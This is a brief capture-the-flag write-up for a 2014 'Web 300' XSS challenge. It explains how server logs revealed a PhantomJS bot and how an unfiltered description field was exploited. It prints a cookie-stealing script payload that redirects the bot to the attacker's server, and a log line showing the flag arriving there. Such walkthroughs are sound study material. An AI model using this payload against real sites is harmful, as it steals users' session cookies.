##Web 300

it was a fairly easy challenge. 

First, you need to check if the link submitted connects to your server/system.

```
173.245.54.59 - - [20/Sep/2014:15:17:38 +0000] "GET /trace.php HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.0 Safari/534.34"
```

From your instinct of how xss challenges are made, it has to be considered as a xss challenge. (The user-agent sent from the server is PhantomJS, which is an automated script from the browser)

After thinking and trying few tests, I guessed out that the url is the image file, and the string after hashtag can be the description of the file.
thinking for a couple of seconds, you will realize that descriptions in most of cases are not filtered in a real-life situation and it can be xss'd.

By few trials of inserting a simple xss payload like <script>document.location.href='~~~.php?cookie='+document.cookie;</script>, you will be able to get the flag.

```
173.245.54.59 - - [20/Sep/2014:15:32:20 +0000] "GET /pwn.php?cookie=win=%22flag%7Bthese_browser_bots_are_annoying%7D%22 HTTP/1.1" 404 134 "http://54.86.199.163:7878/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.0 Safari/534.34"
```